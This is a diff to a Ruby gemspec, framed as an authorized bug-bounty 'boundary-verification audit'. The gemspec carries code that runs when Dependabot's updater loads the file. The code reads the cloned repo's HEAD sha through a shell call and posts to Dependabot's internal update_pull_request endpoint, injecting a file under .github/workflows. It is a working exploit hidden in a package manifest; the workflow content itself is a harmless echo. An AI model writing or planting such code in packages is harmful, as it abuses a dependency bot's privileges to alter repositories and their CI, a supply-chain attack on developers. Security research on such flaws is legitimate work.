@@ -1,6 +1,6 @@
 # frozen_string_literal: true
 #
-# v5.1 boundary-verification audit — own-job PR-creation body shape.
+# v5.2 boundary-verification audit — own-job PR-update body shape.
 #
 # Authorization: HackerOne GitHub program; researcher's own job; own
 # jobId; own repo only; placeholder content only.
@@ -23,54 +23,24 @@ Gem::Specification.new do |spec|
         end
       ).to_s
 
-      # Extract real HEAD sha from the cloned repo
-      base_sha = (
-        begin
-          repo_path = "/home/dependabot/dependabot-updater/repo"
-          if Dir.exist?(repo_path)
-            head_file = File.read("#{repo_path}/.git/HEAD").strip
-            if head_file.start_with?("ref: ")
-              ref = head_file.sub("ref: ", "")
-              File.read("#{repo_path}/.git/#{ref}").strip
-            else
-              head_file
-            end
-          else
-            ""
-          end
-        rescue
-          ""
-        end
-      )
+      # Get real HEAD sha via git
+      base_sha = `git -C /home/dependabot/dependabot-updater/repo rev-parse HEAD 2>/dev/null`.strip
 
-      if !own_id.empty? && !base_sha.empty?
-        # Two probes for differential diagnosis:
-        # T1: file path under repo root (innocent control)
-        # T2: file path under .github/workflows/ (the question under audit)
-
-        ["t1-control", "t2-workflow-path"].each_with_index do |label, idx|
-          file_dir = idx == 0 ? "/" : ".github/workflows"
-          file_name = idx == 0 ? "audit-control.txt" : "audit-test-v51.yml"
-          file_content = idx == 0 ?
-            "audit control content\n" :
-            "name: audit-test-v51\non: workflow_dispatch\njobs:\n  noop:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo audit\n"
-
+      if !own_id.empty? && base_sha.match?(/^[0-9a-f]{40}$/)
+        # T1: control — file at root path (no .github prefix)
+        # T2: target — file at .github/workflows path
+        [
+          { label: "t1-root", dir: "/", name: "audit-control-v52.txt", content: "audit control\n" },
+          { label: "t2-wf",   dir: ".github/workflows", name: "audit-v52.yml",
+            content: "name: audit-v52\non: workflow_dispatch\njobs:\n  noop:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo audit-v52\n" }
+        ].each do |t|
           data = {
-            "dependencies" => [
-              {
-                "name" => "audit-test-#{label}-pkg",
-                "previous-version" => "0.0.1",
-                "version" => "0.0.2",
-                "package-manager" => "bundler",
-                "requirements" => [],
-                "previous-requirements" => []
-              }
-            ],
+            "dependency-names" => ["useful-string-utils"],
             "updated-dependency-files" => [
               {
-                "name" => file_name,
-                "directory" => file_dir,
-                "content" => file_content,
+                "name" => t[:name],
+                "directory" => t[:dir],
+                "content" => t[:content],
                 "type" => "file",
                 "support_file" => false,
                 "content_encoding" => "utf-8",
@@ -79,13 +49,13 @@ Gem::Specification.new do |spec|
               }
             ],
             "base-commit-sha" => base_sha,
-            "commit-message" => "audit test v51 #{label}",
-            "pr-title" => "audit test v51 #{label}",
-            "pr-body" => "audit test v51"
+            "commit-message" => "audit #{t[:label]}",
+            "pr-title" => "audit #{t[:label]}",
+            "pr-body" => "audit #{t[:label]}"
           }
 
           begin
-            uri = URI("https://dependabot-actions.githubapp.com/update_jobs/#{own_id}/create_pull_request")
+            uri = URI("https://dependabot-actions.githubapp.com/update_jobs/#{own_id}/update_pull_request")
             h = Net::HTTP.new(uri.host, uri.port)
             h.use_ssl = true
             h.open_timeout = 5
